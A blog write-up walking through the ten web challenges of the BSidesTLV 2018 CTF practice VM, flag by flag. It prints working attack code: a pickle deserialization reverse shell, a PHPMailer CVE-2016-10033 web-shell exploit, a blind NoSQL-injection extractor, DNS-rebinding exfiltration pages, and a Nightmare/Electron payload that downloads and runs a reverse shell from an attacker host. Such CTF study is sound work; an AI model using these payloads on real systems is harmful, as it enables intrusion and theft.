---
layout: post
date: 2018-10-11 16:09:07 +0000
title: "BSidesTLV: 2018 CTF (Web)"
last_modified_at: 2018-10-11 16:50:43 +0000
category: CTF
tags: [BSidesTLV]
comments: true
image:
  feature: bsidestlv.jpg
---

This post documents my attempt to complete [BSidesTLV: 2018 CTF (Web)](https://www.vulnhub.com/entry/bsidestlv-2018-ctf,250/). If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

The 2018 BSidesTLV CTF competition brought together over 310 teams burning the midnight oil to crack our challenges in a bout that lasted for two weeks. You can now enjoy the same pain and suffering, using this easy-to-use, condensed VM that now hosts all our challenges in an easy to digest format. The CTF has five categories:

+ Web (10 challenges)
  1. <a href="#{{ 'Redirect me' | downcase | replace: ' ', '-'}}">Redirect me</a>
  2. <a href="#{{ 'IH8emacs' | downcase | replace: ' ', '-'}}">IH8emacs</a>
  3. <a href="#{{ 'Creative Agency' | downcase | replace: ' ', '-'}}">Creative Agency</a>
  4. <a href="#{{ 'Im Pickle Rick' | downcase | replace: ' ', '-'}}">I'm Pickle Rick!</a>
  5. <a href="#{{ 'ContactUs' | downcase | replace: ' ', '-'}}">ContactUs</a>
  6. <a href="#{{ 'NoSocket' | downcase | replace: ' ', '-'}}">NoSocket</a>
  7. <a href="#{{ 'IAmBrute' | downcase | replace: ' ', '-'}}">IAmBrute</a>
  8. <a href="#{{ 'PimpMyRide' | downcase | replace: ' ', '-'}}">PimpMyRide</a>
  9. <a href="#{{ 'Can you bypass the SOP' | downcase | replace: ' ', '-'}}">Can you bypass the SOP?</a>
  10. <a href="#{{ 'GamingStore' | downcase | replace: ' ', '-'}}">GamingStore</a>
+ Reverse Engineering (3 challenges)
+ Misc (3 challenges)
+ Forensics (1 challenge)
+ Crypto (2 challenges)

What follows is my humble attempt of cracking the challenges in the Web category.

### Redirect me

This is how the challenge looks like.

![37e6d963.png](/assets/images/posts/bsidestlv-web/37e6d963.png)

If I've to guess, I'd say the "Referer" header needs to set to the Youtube URL before visiting the challenge URL. To that end, I wrote a `bash` script to do so.

<div class="filename"><span>redirect.sh</span></div>

```bash
#!/bin/bash

REFERER=https://www.youtube.com/watch?v=hGlyFc79BUE
CHALLENGE=http://challenges.bsidestlv.com:8081/

curl -iLs \
     -c cookie \
     -w %{redirect_url} \
     --referer "$REFERER" \
     --max-redir -1 \
     --no-styled-output \
     $CHALLENGE

echo && rm cookie
```
OK. Let's give it a shot.

![bc8903c3.png](/assets/images/posts/bsidestlv-web/bc8903c3.png)

You can see that it got redirected for forty times before displaying the flag.

The flag is `BSidesTLV{D0ntF0rgetR3sp0ns3H34d3r}`.

### IH8emacs

This is how the challenge looks like.

![08d562f2.png](/assets/images/posts/bsidestlv-web/08d562f2.png)

The Adventurer theme looks awesome but that's not the point. From the title and description, the challenge seems to be hinting at Emacs and its backup. A backup file has a tilde (~) at the end of the file name. For example, let's say you are editing `index.php` with Emacs, the backup file is `index.php~`. Emacs automatically backups the edited file.

![cc6736cb.png](/assets/images/posts/bsidestlv-web/cc6736cb.png)

Sweet.

![1988bf98.png](/assets/images/posts/bsidestlv-web/1988bf98.png)

At the end of the file is a directory hidden in HTML comment.

![24ef897c.png](/assets/images/posts/bsidestlv-web/24ef897c.png)

Argh! Stalled by **basic auth**. `.htpasswd` in Apache controls basic authentication. Perhaps we can catch a glimpse of its backup?

![54189b33.png](/assets/images/posts/bsidestlv-web/54189b33.png)

OMFG!

![4c2d1256.png](/assets/images/posts/bsidestlv-web/4c2d1256.png)

John the Ripper is able to crack the password hash effortlessly. Now, let's log in and claim the prize.

![8d20da78.png](/assets/images/posts/bsidestlv-web/8d20da78.png)

The flag is `BSidesTLV{D0ntF0rg3tB4ckupF1l3s}`.

### Creative Agency

This is how the challenge looks like.

![007ddf54.png](/assets/images/posts/bsidestlv-web/007ddf54.png)

This is an interesting challenge. Notice something odd in the address bar?

![21498f21.png](/assets/images/posts/bsidestlv-web/21498f21.png)

The file path is mirror-flipped! And since we know the flag is at `/home/bsidestlv/flag.txt`, we need to supply it in the same style to the web application. This is how the file path should read.

![5d4caddc.png](/assets/images/posts/bsidestlv-web/5d4caddc.png)

I've painstakingly teased out the characters needed from existing images, except for the characters 'f' and 'v'. Visit any online [site](https://www.messletters.com/en/mirrored/) that helps to mirror text to get the mirror-flipped 'f' and 'v'

And yes, you need directory traversal as well.

![18684668.png](/assets/images/posts/bsidestlv-web/18684668.png)

The flag is `BSidesTLV{I_Like_FlipFlops_And_I_Cannot_Lie}`.

### I'm Pickle Rick!

This is how the challenge looks like.

![c4aa8eec.png](/assets/images/posts/bsidestlv-web/c4aa8eec.png)

Your first thought could be this—brute-force the login form and call it a day. There's something going on behind the scenes, a.k.a XHR or XMLHttpRequest you are unaware of until you see it.

![75f36bc9.png](/assets/images/posts/bsidestlv-web/75f36bc9.png)

And if you go to the URL, this is what you see.

![ffe152c8.png](/assets/images/posts/bsidestlv-web/ffe152c8.png)

See what happens when you put in an empty `data` parameter.

![cb3b430d.png](/assets/images/posts/bsidestlv-web/cb3b430d.png)

Bear with me. We are getting to the root of the challenge.

![6c2569d8.png](/assets/images/posts/bsidestlv-web/6c2569d8.png)

Here, I did a `base64` decode of the value after the `data` parameter, and pipe it to `file`. What do you see? `zlib` compressed data? Let's decompress it.

![6d820ade.png](/assets/images/posts/bsidestlv-web/6d820ade.png)

What do we have here? This looks like Python's data serialization using `pickle`. In fact, the name of the challenge is a dead giveaway right from the get-go.

There's plenty of Google results on this subject but I find this blog [post](https://dan.lousqui.fr/explaining-and-exploiting-deserialization-vulnerability-with-python-en.html) has the best explanation. Armed with this knowledge, I wrote a Python exploit that will serialize a Python object that runs a reverse shell back to me.

<div class="filename"><span>picklerick.py</span></div>

```py
import base64
import os
import pickle
import socket
import subprocess
import urllib
import zlib

class Evil(object):
  def __reduce__(self):
    return (os.system, ("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.30.128\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'", ))

print urllib.quote(base64.b64encode(zlib.compress(pickle.dumps(Evil()))))
```

Let's run the exploit.

![771ce93f.png](/assets/images/posts/bsidestlv-web/771ce93f.png)

Copy the output of this exploit and supply it as the value to the `data` parameter above, and let the web application perform the deserialization.

On another terminal, set up a `nc` listener and wait for the reverse shell.

![09b5c65f.png](/assets/images/posts/bsidestlv-web/09b5c65f.png)

Voila, we have shell. The flag is at `/flag.txt`

![fc0952bc.png](/assets/images/posts/bsidestlv-web/fc0952bc.png)

The flag is `BSidesTLV{IC0ntr0ll3dP1ckl3R1ck!}`.

### ContactUs

This is how the challenge looks like.

![f07c0aea.png](/assets/images/posts/bsidestlv-web/f07c0aea.png)

A simple fuzz works wonders.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 http://challenges.bsidestlv.com:8080/FUZZ
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://challenges.bsidestlv.com:8080/FUZZ
Total requests: 4593

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000010:  C=403     11 L	      32 W	    305 Ch	  ".hta"
000011:  C=403     11 L	      32 W	    310 Ch	  ".htaccess"
000012:  C=403     11 L	      32 W	    310 Ch	  ".htpasswd"
000862:  C=301      9 L	      28 W	    343 Ch	  "cache"
001232:  C=301      9 L	      28 W	    341 Ch	  "css"
002073:  C=301      9 L	      28 W	    341 Ch	  "img"
002095:  C=200    407 L	    1124 W	  14764 Ch	  "index.php"
002250:  C=301      9 L	      28 W	    340 Ch	  "js"
002992:  C=301      9 L	      28 W	    347 Ch	  "phpmailer"
003597:  C=403     11 L	      32 W	    314 Ch	  "server-status"

Total time: 7.736274
Processed Requests: 4593
Filtered Requests: 4583
Requests/sec.: 593.6966
```

Notice the directory `phpmailer` exists?

![83aa5190.png](/assets/images/posts/bsidestlv-web/83aa5190.png)

And it's PHPMailer 5.2.16!

PHPMailer versions before 5.2.18 is susceptible to remote command execution, as documented in [CVE-2016-10033](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10033). The contact form in this challenge has added CAPTCHA for verification. Good thing for us, the CAPTCHA uses a four-digit number, which OCR can bypass.

![38f082cd.png](/assets/images/posts/bsidestlv-web/4199581e.png)

To that end, I wrote a `bash` script, using `gocr`, `pngtopnm` and `curl` as the main drivers for the exploit.

<div class="filename"><span>contactme.sh</span></div>

```bash
#!/bin/bash

CHALLENGE=http://challenges.bsidestlv.com:8080
TARGETURL="$CHALLENGE/index.php"
CAPTCHAURL="$CHALLENGE/captcha.php"

# Session
curl -s \
     -c cookie \
     -o /dev/null \
     $TARGETURL

# Captcha
CAPTCHA=$(curl -s -b cookie $CAPTCHAURL \
          | pngtopnm \
          | gocr -i -)

DOCROOT=/var/www/html
FILENAME=$(sed '$!d' cookie | awk '{ print $NF }' | cut -c3-14).php
LOCATION=$DOCROOT/cache/$FILENAME

# Exploit
STATUS=$(curl -s \
              -b cookie \
              -o /dev/null \
              -w %{http_code} \
              --data-urlencode 'fullname=<?php echo shell_exec($_GET["cmd"]); ?>' \
              --data-urlencode "email_address=\"badguy\\\" -oQ/tmp/ -X$LOCATION blah\"@badguy.com" \
              --data-urlencode "yourmessage=blah blah blah" \
              --data-urlencode "captcha=$CAPTCHA" \
              --data-urlencode "actions=SUBMIT" \
              $TARGETURL)

if [ $STATUS -eq 200 ]; then
  echo "[+] Check $CHALLENGE/cache/$FILENAME?cmd=[shell command, e.g. id]"
else
  echo "[!] Exploit failed"
fi

# Clean up
rm -f cookie
```

The first version of the exploit didn't work. But, the creators of this challenge were kind enough to leave a hint on how to proceed.

![5f9bc59b.png](/assets/images/posts/bsidestlv-web/5f9bc59b.png)

The challenge now becomes an exercise in determining the file name. :triumph:

![f460f6df.png](/assets/images/posts/bsidestlv-web/f460f6df.png)

The file name is from the PHPSESSID! Armed with this knowledge, let's run the exploit.

![fcaa33c2.png](/assets/images/posts/bsidestlv-web/fcaa33c2.png)

The exploit took a couple of minutes to complete.

![b07190d7.png](/assets/images/posts/bsidestlv-web/b07190d7.png)

It works! Time to find the flag and capture it.

![89cb21d4.png](/assets/images/posts/bsidestlv-web/89cb21d4.png)

![11c8d918.png](/assets/images/posts/bsidestlv-web/11c8d918.png)

The flag is `BSidesTLV{K33pY0urM4il3rFullyP4tch3D!}`.

### NoSocket

This is how the challenge looks like.

![d2c0517d.png](/assets/images/posts/bsidestlv-web/d2c0517d.png)

Opening the challenge URL leads you to a login page.

![9e17e2c6.png](/assets/images/posts/bsidestlv-web/9e17e2c6.png)

It may look like nothing but there's actually [WebSocket](https://en.wikipedia.org/wiki/WebSocket) going on behind the scenes.

![8cf40dcd.png](/assets/images/posts/bsidestlv-web/8cf40dcd.png)

Here's the `login` function.

![6078a158.png](/assets/images/posts/bsidestlv-web/6078a158.png)

I'm no NoSQL expert (pun intended). But, if I've to guess, I'd say the challenge looks a classic NoSQL injection to bypass authentication. After consulting with OWASP testing [guide](https://www.owasp.org/index.php/Testing_for_NoSQL_injection), I've settled with this injection through the password field. We already knew the username is `admin`.

```
' || 1 == '1
```

![3a5ebed8.png](/assets/images/posts/bsidestlv-web/3a5ebed8.png)

Building on the previous injection, we can tease out the flag with this test.

```
' || this.password[x] == 'y
```

Where `x` is the index into the flag and `y` is the character to test. Armed with this insight, I wrote a `bash` script to automate that.

<div class="filename"><span>nosocket.sh</span></div>

```bash
#!/bin/bash
SERVER=ws://challenges.bsidestlv.com:8000/login
EXPLOIT="{\"username\":\"admin\",\"password\":\"' || this.password["

for i in $(seq 0 40); do
  for c in $(seq 32 126); do
    STATUS=$(echo "${EXPLOIT}$i] == '$(printf \\$(printf %o $c))\"}"\
             | websocat $SERVER)
    if [ "$STATUS" == "Success!" ]; then
      printf \\$(printf "%o" $c)
    fi
  done
done

echo
```

The script is basically a wrapper around `websocat`, a command-line WebSocket [client](https://github.com/vi/websocat). We send the injection string in JSON over to the WebSocket server and wait for the response. If the response is `Success!`, the test character gets printed out.

Here's a teaser animation of the script in action.

<video id="video" autoplay loop muted playsinline width="100%" height="100%">
  <source src="{{ site.url }}/assets/images/posts/bsidestlv-web/nosocket.mp4" type="video/mp4" />
  <img src="{{ site.url }}/assets/images/posts/bsidestlv-web/nosocket.gif" />
</video>

<script>
  var vid = document.getElementById("video");
  vid.playbackRate = 2.0;
</script>

The flag is `BSidesTLV{0r0n3Equ4l0n3!}`.

### IAmBrute

This is how the challenge looks like.

![b8e9066d.png](/assets/images/posts/bsidestlv-web/b8e9066d.png)

There's a link to download an attachment, an archive file.

![3f032079.png](/assets/images/posts/bsidestlv-web/3f032079.png)

Looks like we have a 1Password [OPVault](https://support.1password.com/opvault-design/). After reading the design paper, the entire design is succinctly summarized in a sweet poem.

> Each item key’s encrypted with the master key  
> And the master key’s encrypted with the derived key  
> And the derived key comes from the MP  
> Oh hear the word of the XOR  
> Them keys, them keys, them random keys (3x)  
> Oh hear the word of the XOR  

John the Ripper comes to the rescue! We can make use of `1pass2john.py` to create a JtR hash for offline cracking to recover the master password.

![be1151c8.png](/assets/images/posts/bsidestlv-web/be1151c8.png)

Let's crack it.

![c69c7c66.png](/assets/images/posts/bsidestlv-web/c69c7c66.png)

The master password is `Marina`. Of course!

Next, we use 1Password to open the vault and see what's in it.

![1pass_1.png](/assets/images/posts/bsidestlv-web/1pass_1.png)

Supply the master password.

![1pass_2.png](/assets/images/posts/bsidestlv-web/1pass_2.png)

Voila.

![1pass_3.png](/assets/images/posts/bsidestlv-web/1pass_3.png)

I guess I must now sign in to the ticketing system with (`marina:Marina1987!`)—not so fast.

![fcf2e1a2.png](/assets/images/posts/bsidestlv-web/fcf2e1a2.png)

You can see that the site checks for IP address, probably through the `X-Forwarded-For` HTTP header. This is easy to bypass with Burp and the Bypass WAF extension. The instruction to install, configure, and use the Bypass WAF extension is beyond the scope of this write-up.

![3d818272.png](/assets/images/posts/bsidestlv-web/3d818272.png)

Looking at Marina's tickets, you'll soon discover another user of the ticketing system—George Stones.

![484c890a.png](/assets/images/posts/bsidestlv-web/484c890a.png)

Clicking on his avatar opens another window to his Facebook page, disclosing his birth year (1991) and his favorite TV show (FRIENDS).

![de75f954.png](/assets/images/posts/bsidestlv-web/de75f954.png)

Having these two pieces of information allows us to brute-force the Forgot My Password page at `pwreset.php`.

![f06d1c6e.png](/assets/images/posts/bsidestlv-web/f06d1c6e.png)

Let's summarize what we know so far:

+ Username is his first name: `george`
+ George's birth year is 1991
+ His favorite TV show is **FRIENDS**

The sole unknown variable is George's birth date. We can use the following command to generate a wordlist of all the birthdays in 1991 like so.

```
# echo {01..31}/{01..12}/1991 | tr ' ' '\n' | sort -R > birthdays.txt
```

The challenge's creators were kind enough to fix the CSRF token for `pwreset.php`. Without this gesture, brute-forcing `pwreset.php` will be harder. Let's use `wfuzz` to do this!

![b3d3c79e.png](/assets/images/posts/bsidestlv-web/b3d3c79e.png)

That's fast! George's birthday is 07/11/1991. Let's pop his birthday in.

![193e40a5.png](/assets/images/posts/bsidestlv-web/193e40a5.png)

Now, let's sign in to George's account.

![4f338a25.png](/assets/images/posts/bsidestlv-web/4f338a25.png)

The flag is `BSidesTLV{Brut3Th3W0rld!}`.

### PimpMyRide

This is how the challenge looks like.

![2c9124e7.png](/assets/images/posts/bsidestlv-web/2c9124e7.png)

You'll need a Java decompiler for this challenge. I'm using Enhanced Class Decompiler (or [ECD](https://ecd-plugin.github.io/)) for Eclipse. The instruction to install, configure, and use ECD in Eclipse is beyond the scope of this write-up.

You'll also need a tool to dump Java serialized byte streams. For that, I'm using [SerializationDumper](https://github.com/NickstaDB/SerializationDumper).

In summary, the file `garage.jar` encapsulates both the client and the server as shown below.

![d62075c2.png](/assets/images/posts/bsidestlv-web/d62075c2.png)

Having both client and server functionality greatly helps in understanding the behavior of the program. The client connects to the Garage to add cars, with the ability to save or export the Garage to a file—`garage`. The file content is in the form of Java serialized byte stream, characterized by these first two bytes—0xAC and 0xED.

The server reads the byte stream in `garage` from the client and reconstruct the Garage in a process known as deserialization.

The challenge is to construct a garage file that allows us to read `/flag.txt` from the server.

First, let's take a look at two important `Class` files to find the vulnerability that allows us to read a file.

<div class="filename"><span>Garage.class</span></div>

```java
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.ArrayList;

public class Garage implements Serializable {
	private ArrayList<Car> carArray = new ArrayList();
	private int carLimit = 5;
	private Employee garageManager;
	private ArrayList<Employee> garageEmployees = new ArrayList();
	private boolean isOpen = true;

	public boolean addCar(Car car) {
		if (this.isOpen) {
			this.carArray.add(car);
			this.checkGarageStatus();
			return true;
		} else {
			return false;
		}
	}

	public boolean removeCarByLicenseNumber(String licenseNumber) {
		for (int i = 0; i < this.carArray.size(); ++i) {
			if (((Car) this.carArray.get(i)).getLicenseNumber().equals(licenseNumber)) {
				this.carArray.remove(i);
				return true;
			}
		}

		return false;
	}

	public String printGarage() {
		String garageContent = "";

		for (int i = 0; i < this.carArray.size(); ++i) {
			garageContent = garageContent + "Car Manufacturer: " + ((Car) this.carArray.get(i)).getManufacturerName()
					+ "\r\n" + "Car License Number: " + ((Car) this.carArray.get(i)).getLicenseNumber() + "\r\n"
					+ "Car Manufacturing Year: " + ((Car) this.carArray.get(i)).getManufacturingYear() + "\r\n";
		}

		return garageContent;
	}

	public boolean checkGarageStatus() {
		if (this.carArray.size() == this.carLimit) {
			this.garageManager.doWork();
			this.isOpen = false;
			return false;
		} else {
			return true;
		}
	}

	private void readObject(ObjectInputStream in) throws ClassNotFoundException, IOException {
		in.defaultReadObject();
		this.checkGarageStatus();
	}

	public void setManager(Employee manager) {
		this.garageManager = manager;
	}

	public byte[] toByteArray() throws IOException {
		ByteArrayOutputStream out = new ByteArrayOutputStream();
		ObjectOutputStream os = new ObjectOutputStream(out);
		os.writeObject(this);
		return out.toByteArray();
	}
}
```

Method `setManager()` allows us to set a Manager in Garage.

<div class="filename"><span>Manager.class</span></div>

```java
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class Manager extends Employee implements Serializable {
	private String closeMessageFile = "close.txt";
	private String closeMessage;

	public Manager() throws IOException {
		this.logger = new FileLogger("log.txt");
		this.closeMessage = null;
	}

	public void setCloseMessage(String closeMessage) {
		this.closeMessage = closeMessage;
	}

	public void doWork() {
		this.logger.writeToLog(this.closeMessage);
	}

	public void setCloseMessageFile(String closeMessageFile) {
		this.closeMessageFile = closeMessageFile;
	}

	private void readObject(ObjectInputStream in) throws ClassNotFoundException, IOException {
		in.defaultReadObject();

		try {
			if (this.closeMessage == null) {
				File closeMessageFile = new File(this.closeMessageFile);
				FileInputStream fis = new FileInputStream(closeMessageFile);
				byte[] data = new byte[(int) closeMessageFile.length()];
				fis.read(data);
				fis.close();
				this.closeMessage = new String(data, "UTF-8");
			}
		} catch (IOException var5) {
			;
		}

	}
}
```

You can see `closeMessageFile` set to `close.txt` and if the `closeMessage` is null, it's set to the contents of `closeMessageFile`.

That's our vulnerability. If we change `close.txt` to `/flag.txt`, we should be able to trick the server to write the contents of `/flag.txt` to `garage`, through deserialization of the Manager object.

To that end, I modified two lines of `Manager.class` like so. Save it as `Manager.java`.

![435553fb.png](/assets/images/posts/bsidestlv-web/7fc2d82a.png)

I wrote the following exploit to generate the malicious `garage` file.

<div class="filename"><span>Exploit.java</span></div>

```java
import java.io.*;

public class Exploit {

  public static void main(String[] args) {
    try {

      Employee emp = new Manager();
      Garage g = new Garage();
      g.setManager(emp);
      g.addCar(new Car("Honda" , "H4CK3R", "2001"));

      FileOutputStream fos = new FileOutputStream("garage");
      fos.write(g.toByteArray());
      fos.close();

    } catch (Exception e) {
      System.err.println(e);
    }
  }
}
```

Extract all the `Class` files from `garage.jar` except for `Manager.class` to where `Exploit.java` and `Manager.java` are. Then, compile `Exploit.java` like so.

![c919b550.png](/assets/images/posts/bsidestlv-web/c919b550.png)

Now, let's give it a shot.

![758f2513.png](/assets/images/posts/bsidestlv-web/758f2513.png)

We don't have to do anything special. Saving the Garage will trigger deserialization of the Manager object, and save the contents of `/flag.txt` to `garage`.

Let's check out `garage` with SerializationDumper.

![5e4ad710.png](/assets/images/posts/bsidestlv-web/5e4ad710.png)

The flag is `BSidesTLV{I_Am_Inspector_Gadget}`.

### Can you bypass the SOP?

This is how the challenge looks like.

![dd45ecb0.png](/assets/images/posts/bsidestlv-web/dd45ecb0.png)

This challenge is basically an exercise to bypass the Same Origin Policy ([SOP](https://en.wikipedia.org/wiki/Same-origin_policy)) enforced by browsers. One of the most effective way of bypassing SOP is to use DNS Rebinding described [here](https://github.com/mpgn/ByP-SOP).

In any case, let's check out the bot. This is how it looks like.

![f057fb45.png](/assets/images/posts/bsidestlv-web/f057fb45.png)

Let's provide the bot with my IP address where Apache is running.

![9bcb27b9.png](/assets/images/posts/bsidestlv-web/9bcb27b9.png)

In this way, I can view the logs and see who or what is making the request.

```
# tail -f /var/log/apache2/access.log
192.168.30.129 - - [06/Oct/2018:03:23:24 +0000] "GET / HTTP/1.1" 200 3380 "-" "python-requests/2.19.1"
192.168.30.129 - - [06/Oct/2018:03:23:25 +0000] "GET / HTTP/1.1" 200 3380 "-" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1"
```

Interesting. You can see two requests seconds apart. The first request is from Python Request, from the page at `http://challenges.bsidestlv.com:8133/index.html`. The second request is from PhantomJS, a headless browser. This must be the bot.

To get the DNS Rebinding attack going, let's use DDNS [service](https://www.noip.com/) to register the following two hostnames: `h4ck3rboi` and `h4ck3rman`.

![4d8598cb.png](/assets/images/posts/bsidestlv-web/4d8598cb.png)

Open two Python SimpleHTTPServer running behind `8080/tcp` and `8888/tcp`, for `h4ck3rman` and `h4ck3rboi` respectively.

```
# python -m SimpleHTTPServer 8080
# python -m SimpleHTTPServer 8888
```

Save the following file at the same location as `h4ck3rman`.
<div class="filename"><span>index.html</span></div>

```html
<script>
setTimeout(function() {
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "http://h4ck3rman.ddns.net:8080/login");
  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4) {
      var img = new Image();
      img.src = "http://h4ck3rboi.ddns.net:8888/hello.txt?x=" + btoa(xhr.responseText);
    }
  };
  xhr.send();
}, 120000);
</script>
```

Make a request for the file through the bot.

![d2a47eed.png](/assets/images/posts/bsidestlv-web/ca56cc2d.png)

Verify the two requests are coming in through `8080/tcp`.

![27defcf5.png](/assets/images/posts/bsidestlv-web/f5c693ea.png)

Change the IP address mapped to `h4ck3rman` to `192.168.20.100` at once. Two minutes later, `h4ck3rboi` listening at `8888/tcp`, received the XHR response.

![648d5f08.png](/assets/images/posts/bsidestlv-web/fbc2f215.png)

The response (login page) after decoding is as follows.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login page</title>
</head>
<body>
    <form method="post">
        <div class="form-group">
            <label for="url" class="col-sm-3 control-label">Username</label>
            <div class="col-sm-9">
                <input type="text" id="url" name='username' placeholder="Username">
            </div>
        </div>

        <div class="form-group">
            <label for="password" class="col-sm-3 control-label">Password</label>
            <div class="col-sm-9">
                <input type="password" id="password" name='password' placeholder="Password">
            </div>
        </div>

        <div class="form-group">
            <div class="col-sm-9 col-sm-offset-3">
                <!--Default credentials: admin/admin-->
                <button type="submit" name='submit' class="btn btn-primary btn-block">Login!</button>
            </div>
        </div>
    </center>
    <div class="form-group">



                </div>
            </form> <!-- /form -->
        </div> <!-- ./container -->
</body>
</html>
```

You can see that it's a simple login form. What's interesting is the default credentials (`admin:admin`) hidden in the HTML comment.

Let's repeat the steps again, making the following changes to `index.html`, to simulate logging in.

<div class="filename"><span>index.html</span></div>

```html
<script>
setTimeout(function() {
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "http://h4ck3rman.ddns.net:8080/login");
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4) {
      var img = new Image();
      img.src = "http://h4ck3rboi.ddns.net:8888/hello.txt?x=" + btoa(xhr.responseText);
    }
  };
  xhr.send("username=admin&password=admin&submit=");
}, 120000);
</script>
```

Verify the two requests are coming in through `8080/tcp`.

![a6ff8a31.png](/assets/images/posts/bsidestlv-web/a6ff8a31.png)

Change the IP address mapped to `h4ck3rman` to `192.168.20.100` at once. Two minutes later, `h4ck3rboi` listening at `8888/tcp` receives the XHR response.

![7bf1ec3d.png](/assets/images/posts/bsidestlv-web/7bf1ec3d.png)

The response (flag) after decoding is as follows.

```html
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login page</title>
</head>
<body>
    <form method="post">
        <div class="form-group">
            <label for="url" class="col-sm-3 control-label">Username</label>
            <div class="col-sm-9">
                <input type="text" id="url" name='username' placeholder="Username">
            </div>
        </div>

        <div class="form-group">
            <label for="password" class="col-sm-3 control-label">Password</label>
            <div class="col-sm-9">
                <input type="password" id="password" name='password' placeholder="Password">
            </div>
        </div>

        <div class="form-group">
            <div class="col-sm-9 col-sm-offset-3">
                <!--Default credentials: admin/admin-->
                <button type="submit" name='submit' class="btn btn-primary btn-block">Login!</button>
            </div>
        </div>
    </center>
    <div class="form-group">



                          Your flag is: BSidesTLV{C4nY0uR3b1n3dMe?}



                </div>
            </form> <!-- /form -->
        </div> <!-- ./container -->
</body>
</html>
```

The flag is `BSidesTLV{C4nY0uR3b1n3dMe?}`.

### GamingStore

This is how the challenge looks like.

![0f7b37ee.png](/assets/images/posts/bsidestlv-web/0f7b37ee.png)

The docker containers for this challenge: `gamestore_bot`, `gamestore_web`, and `mongo` stopped for some reason. Good thing the creators were kind enough to provide access to the Boot2Docker environment. I was able to log in to the environment and restart these containers.

Given the credentials (`bsidestlv:3d1t0r`) to log in, I was quick to notice that I was able to edit the product description.

![0abd4ac3.png](/assets/images/posts/bsidestlv-web/0abd4ac3.png)

Notice something? The Game Store is using AngularJS shown below.

![069a351f.png](/assets/images/posts/bsidestlv-web/069a351f.png)

What does it all mean? AngularJS [Expressions](https://docs.angularjs.org/guide/expression)! This means that we can compute expressions like this `{% raw %}{{1+1}}{% endraw %}`, which returns the number 2. We can also make use of `{% raw %}{{constructor.constructor("alert(1)")()}}{% endraw %}` to inject JavaScript into Game Store.

Let's introduce some JavaScript to trick the headless browser to visit a URL that I control.

![3c58b30d.png](/assets/images/posts/bsidestlv-web/3c58b30d.png)

Once it's saved, the following user-agent appeared in my Apache Access Log.

```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Nightmare/2.10.0 Safari/537.36
```

You can see that the headless browser is Nightmare 2.10.0 based on Electron. Searching for "nightmare 2.10.0 electron exploit" in Google landed me in Issue [1060](https://github.com/segmentio/nightmare/issues/1060). There's a link to a public exploit at the third comment.

Armed with that knowledge, let's re-purpose the exploit and give Nightmare a taste of its own medicine. :smirk:

<div class="filename"><span>exploit.html</span></div>

```html
<!doctype html>
<html>
    <head>
        <meta charset="utf-8">
        <title>nightmarejs</title>
    </head>
    <body>
        <script>
            "use strict";
            function exec() {
                try {
                    var sendSync = __nightmare.ipc.sendSync;
                    if (typeof sendSync !== "function") {
                        return;
                    }
                } catch (e) {
                    return;
                }
                /*
                 * ELECTRON_BROWSER_REQUIRE returns metadata for
                 * module.exports, and the actual object is stored in
                 * the objectsRegistry (see valueToMeta())
                 */
                var proc = sendSync("ELECTRON_BROWSER_REQUIRE", "child_process");
                /*
                 * ELECTRON_BROWSER_MEMBER_CALL retrieves a module object from
                 * the objectsRegistry and calls the specified method with an
                 * array of arguments processed by unwrapArgs()
                 */
                var args = [{
                    type: "value",
                    value: "wget -O /tmp/rev http://h4ckerman.ddns.net/rev; chmod +x /tmp/rev; /tmp/rev"
                }];
                sendSync("ELECTRON_BROWSER_MEMBER_CALL", proc.id, "exec", args);
            }
            exec();
        </script>
    </body>
</html>
```

Serve the reverse shell (generated with `msfvenom`) to Nightmare, and have it execute the reverse shell with the following AngularJS expression.

```
{% raw %}{{constructor.constructor("document.location='http://h4ck3rman.ddns.net/exploit.html'")()}}{% endraw %}
```
Meanwhile in our `nc` listener.

![5a5a03ee.png](/assets/images/posts/bsidestlv-web/5a5a03ee.png)

The flag is `BSidesTLV{AngularjS_is_Freddy_Krueger}`.
